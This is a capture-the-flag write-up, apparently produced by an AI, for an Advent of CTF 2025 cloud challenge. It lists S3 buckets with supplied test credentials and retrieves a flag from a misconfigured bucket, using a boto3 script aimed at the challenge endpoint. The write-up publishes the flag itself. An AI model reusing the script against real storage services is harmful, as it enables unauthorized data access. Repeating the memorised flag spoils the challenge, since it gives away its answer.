# Day 19 Trust Issues

Solved by AI:

# Advent of CTF 2025 - Day 19: Trust Issues - Attack Notes

## Challenge Summary
This was a cloud security challenge involving an S3-compatible storage service with misconfigured access controls. Despite the challenge description mentioning IAM privilege escalation, the actual solution was simpler: the S3 bucket containing classified data was publicly accessible with the provided credentials.

## Attack Steps

### 1. Initial Reconnaissance
- Endpoint: https://trust-issues.csd.lol
- Credentials: test / test (basic auth)
- Service type: S3-compatible storage (likely LocalStack)

### 2. Service Discovery
- The service accepts S3 API calls
- Using boto3 with custom endpoint URL and basic auth credentials
- Discovered 4 buckets:
  1. npld-backup-vault-7f3a
  2. npld-public-assets
  3. npld-logs-archive
  4. elf-hr-documents

### 3. Bucket Enumeration
- Listed objects in each bucket
- Found `classified/wishlist-backup.txt` in `npld-backup-vault-7f3a`
- File contained the flag: `csd{sO_M4NY_VUln3R48L3_7H1Ngs_7H3S3_d4yS_s1gh_bc653}`

### 4. Flag Extraction
- Direct S3 GET request to retrieve the file
- No privilege escalation needed - the bucket was accessible with the provided credentials

## Technical Details

### Authentication Method
- Basic authentication (username: test, password: test)
- S3 API calls with custom endpoint configuration
- Region: us-east-1 (as specified in challenge)

### Tools Used
- Python 3 with boto3 library
- Custom S3 client configuration
- Basic curl for initial testing

### Code Snippet
```python
import boto3
from botocore.client import Config

s3_client = boto3.client(
    's3',
    endpoint_url='https://trust-issues.csd.lol',
    aws_access_key_id='test',
    aws_secret_access_key='test',
    region_name='us-east-1',
    config=Config(signature_version='s3v4')
)

response = s3_client.get_object(
    Bucket='npld-backup-vault-7f3a',
    Key='classified/wishlist-backup.txt'
)
flag = response['Body'].read().decode('utf-8').strip()
```

## Security Issues
1. **Overly Permissive Access**: The S3 bucket containing classified data was accessible with minimal credentials
2. **Lack of Bucket Policies**: No bucket policies restricting access
3. **Misleading Challenge Description**: Suggested IAM privilege escalation was not required
4. **Basic Authentication for S3**: Using basic auth instead of AWS Signature v4 for S3 (though the service accepted it)

## Lessons Learned
- Always enumerate accessible resources first before attempting complex privilege escalation
- Cloud services often have multiple access vectors
- Simple misconfigurations can be as dangerous as complex vulnerabilities
- Challenge descriptions can be misleading or contain red herrings

## Flag
`csd{sO_M4NY_VUln3R48L3_7H1Ngs_7H3S3_d4yS_s1gh_bc653}`

Attack script:

```python
#!/usr/bin/env python3
"""
Advent of CTF 2025 - Day 19: Trust Issues
Flag retrieval script

This script connects to the S3-compatible service at https://trust-issues.csd.lol
using the provided credentials (test/test) and retrieves the flag from the
classified backup file.

The flag is located in: npld-backup-vault-7f3a/classified/wishlist-backup.txt
"""

import boto3
from botocore.client import Config

def get_flag():
    """Retrieve the flag from the S3 bucket."""
    
    # Configuration
    ENDPOINT = "https://trust-issues.csd.lol"
    ACCESS_KEY = "test"
    SECRET_KEY = "test"
    REGION = "us-east-1"
    
    BUCKET = "npld-backup-vault-7f3a"
    KEY = "classified/wishlist-backup.txt"
    
    print("Advent of CTF 2025 - Day 19: Trust Issues")
    print("=" * 50)
    
    try:
        # Create S3 client
        session = boto3.session.Session()
        s3_client = session.client(
            's3',
            endpoint_url=ENDPOINT,
            aws_access_key_id=ACCESS_KEY,
            aws_secret_access_key=SECRET_KEY,
            region_name=REGION,
            config=Config(signature_version='s3v4')
        )
        
        print(f"Connecting to S3 service at {ENDPOINT}...")
        
        # Get the flag file
        print(f"Retrieving {KEY} from bucket {BUCKET}...")
        response = s3_client.get_object(Bucket=BUCKET, Key=KEY)
        flag = response['Body'].read().decode('utf-8').strip()
        
        print("\n" + "=" * 50)
        print(f"FLAG: {flag}")
        print("=" * 50)
        
        return flag
        
    except Exception as e:
        print(f"Error retrieving flag: {e}")
        return None

if __name__ == "__main__":
    get_flag()
```
